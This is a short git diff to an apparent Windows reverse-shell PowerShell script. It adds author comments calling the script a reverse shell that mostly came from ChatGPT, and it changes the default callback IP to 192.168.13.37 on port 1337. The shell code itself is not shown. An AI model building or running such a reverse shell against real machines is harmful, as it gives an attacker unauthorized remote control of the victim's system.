@@ -1,6 +1,11 @@
+# this TECHNICALLY works. i recommend replacing this with a better windows reverse shell or whatever you need
+# i dont particularly care for windows so this script is kinda shit and a solid 80% written by chatgpt
+# it was supposed to minimize itself and then close the cmd window but ehhhhh i really didnt wanna do that
+# maybe ill do so later
+
 # Define the parameters
 param(
-    [string]$I = "192.168.1.232",
+    [string]$I = "192.168.13.37",
     [int]$P = 1337
 )
 
